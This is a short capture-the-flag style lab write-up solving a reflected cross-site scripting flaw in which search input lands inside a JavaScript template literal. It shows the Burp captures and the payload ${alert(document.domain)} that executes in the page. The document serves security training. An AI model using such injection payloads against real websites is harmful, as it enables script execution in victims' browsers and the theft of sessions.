### Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality.  

The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped.  

To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.

_____

Analysis and Exploit:

1. Perfomed a test search using string _testsearch_

    Analyzing captured request in Burp results that the user input is directly embedded between backticks in a script block

    ```html
    <script>
        var message = `0 search results for 'testsearch'`;
        document.getElementById('searchMessage').innerText = message;
    </script>
    ```

2. Injected payload ```${alert(document.domain)}```

    Capture from Burp
    ```html
    <script>
        var message = `0 search results for '${alert(document.domain)}'`;
        document.getElementById('searchMessage').innerText = message;
    </script>
    ```

    The payload works, the alert pops up and the search function returns _0 search results for 'undefined'_
